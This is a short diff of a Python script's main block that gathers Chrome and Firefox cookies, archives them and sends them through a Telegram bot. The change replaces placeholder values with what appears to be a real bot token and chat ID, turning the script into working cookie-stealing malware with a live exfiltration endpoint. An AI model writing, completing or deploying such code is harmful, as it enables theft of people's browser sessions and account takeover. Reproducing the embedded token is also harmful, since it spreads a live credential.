@@ -65,6 +65,6 @@ if __name__ == "__main__":
     all_cookies.extend(get_chrome_cookies())
     all_cookies.extend(get_firefox_cookies())
     archive = create_archive(all_cookies)
-    BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
-    CHAT_ID = "TARGET_CHAT_ID"
+    BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
+    CHAT_ID = "1962231620"
     send_to_telegram(archive, BOT_TOKEN, CHAT_ID)
